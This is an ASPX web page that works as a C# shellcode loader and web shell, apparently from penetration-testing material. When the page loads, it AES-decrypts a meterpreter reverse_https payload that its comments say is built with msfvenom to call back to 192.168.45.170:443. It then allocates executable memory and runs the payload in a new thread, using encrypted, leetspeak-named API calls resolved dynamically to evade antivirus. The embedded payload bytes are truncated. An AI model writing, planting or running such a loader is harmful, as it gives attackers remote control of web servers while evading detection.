<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Reflection.Emit" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">

    // Use Invoke-EncryptAES.ps1 to generate global keys and byte arrays
    // Invoke-EncryptAES  -csharp -InputStrings "WaitForSingleObject, VirtualAlloc, CreateThread, VirtualProtect, system.dll, Kernel32.dll"
    static string GlobalKey = "KgaZym/T7JNdgH1KnU8MqJXSXc9pOUsBZHNiYrL/8Q4=";
    static string GlobalIV = "OFCDDIs421PBuFo0iJfe8w==";

    static byte[] dWaitForSingleObject_Bytes = new byte[32] { 0x1D, 0x31, 0x91, 0x08, 0x91, 0x15, 0xB4, 0x06, 0xDA, 0x1D, 0x68, 0x2D, 0x19, 0xAF, 0x88, 0xF0, 0x69, 0x21, 0x04, 0x51, 0x3F, 0x80, 0x7C, 0x69, 0xEE, 0xC2, 0xAA, 0x01, 0xB0, 0x4E, 0x85, 0x08 };
    static string dWaitForSingleObject = DecryptAESAsString(dWaitForSingleObject_Bytes, GlobalKey, GlobalIV);

    static byte[] dVirtualAlloc_Bytes = new byte[16] { 0xCC, 0x09, 0x2D, 0xDF, 0x1D, 0x3B, 0xC8, 0xF1, 0xCD, 0xEE, 0x0F, 0xB8, 0xDB, 0x12, 0x40, 0x4A };
    static string dVirtualAlloc = DecryptAESAsString(dVirtualAlloc_Bytes, GlobalKey, GlobalIV);

    static byte[] dCreateThread_Bytes = new byte[16] { 0xB4, 0xCB, 0x94, 0x32, 0x25, 0xBE, 0x8B, 0x61, 0xF2, 0x16, 0x24, 0x1D, 0x6C, 0xBF, 0xA7, 0x16 };
    static string dCreateThread = DecryptAESAsString(dCreateThread_Bytes, GlobalKey, GlobalIV);

    static byte[] dVirtualProtect_Bytes = new byte[16] { 0xC3, 0x22, 0x4C, 0xEE, 0x65, 0x76, 0x74, 0xE9, 0xB7, 0x86, 0xFB, 0x23, 0x4F, 0x2D, 0x04, 0x41 };
    static string dVirtualProtect = DecryptAESAsString(dVirtualProtect_Bytes, GlobalKey, GlobalIV);

    static byte[] dKernel32_dll_Bytes = new byte[16] { 0xBC, 0x19, 0xDD, 0x4D, 0x1C, 0x1F, 0xDE, 0x9D, 0xDB, 0xDC, 0x95, 0x5B, 0x84, 0xA7, 0x7A, 0x6D };
    static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);
    // End of output from Invoke-EncryptAES

    protected void Page_Load(object sender, EventArgs e)
    {

// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.170 LPORT=443 -f csharp 
// Invoke-EncryptAES.ps1 -csharp -Bytes 0xfc,0x48,0x83,0xe4...
byte[] Warhead_Bytes = new byte[608] { 0xF3, 0xF1, 0x37 };
byte[] Warhead = DecryptAESAsBytes(Warhead_Bytes, "szMUg6YmqSNeU7QokShVnwpmKpkZVU6+nWe7j00G6A8=", "zyUDAJuCEF8IRX0OBEXuHQ==");
// End of output from Invoke-EncryptAES

        int size = Warhead.Length;

        IntPtr Address = V1rtU4lA1L0c(IntPtr.Zero, (uint)size, 0x3000, 0x04);
        Marshal.Copy(Warhead, 0, Address, size);

        uint oldProtect = 0;
        V1rtU4lPr0t3cT(Address, (uint)size, 0x20, ref oldProtect);

        uint id = 0;
        IntPtr handleThread = Cr34teThR34d(0, 0, Address, IntPtr.Zero, 0, ref id);
        W41tF0rS1ngl30bj3ct(handleThread, 0xFFFFFFFF);
    }

    public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
    {
        var assemblyName = new AssemblyName("DynamicAssembly");
        var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
        var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

        var methodBuilder = moduleBuilder.DefinePInvokeMethod(
            methodName,
            library,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
            CallingConventions.Standard,
            returnType,
            parameterTypes,
            CallingConvention.Winapi,
            CharSet.Ansi
        );

        methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
        moduleBuilder.CreateGlobalFunctions();
        MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

        return dynamicMethod.Invoke(null, arguments);
    }

    public static IntPtr V1rtU4lA1L0c(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint) };
        var argumentTypes = new object[] { lpAddress, dwSize, flAllocationType, flProtect };
        return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dVirtualAlloc, argumentTypes, parameterTypes);
    }

    public static bool V1rtU4lPr0t3cT(IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint).MakeByRefType() };
        var argumentTypes = new object[] { lpAddress, dwSize, flNewProtect, lpflOldProtect };
        return (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dVirtualProtect, argumentTypes, parameterTypes);
    }

    public static IntPtr Cr34teThR34d(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId)
    {
        var parameterTypes = new Type[] { typeof(uint), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(uint).MakeByRefType() };
        var argumentTypes = new object[] { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
        return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateThread, argumentTypes, parameterTypes);
    }

    public static int W41tF0rS1ngl30bj3ct(IntPtr handle, uint wait)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint) };
        var argumentTypes = new object[] { handle, wait };
        return (int)DynamicInvoke(typeof(int), dKernel32_dll, dWaitForSingleObject, argumentTypes, parameterTypes);
    }

    static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
    {
        byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
        return Encoding.UTF8.GetString(decryptedBytes);
    }

    static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
    {
        byte[] key = Convert.FromBase64String(keyBase64);
        byte[] iv = Convert.FromBase64String(ivBase64);

        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;

            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            using (MemoryStream memoryStream = new MemoryStream(data))
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
            {
                byte[] decryptedBytes = new byte[data.Length];
                int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                byte[] result = new byte[decryptedByteCount];
                Array.Copy(decryptedBytes, result, decryptedByteCount);
                return result;
            }
        }
    }

</script>
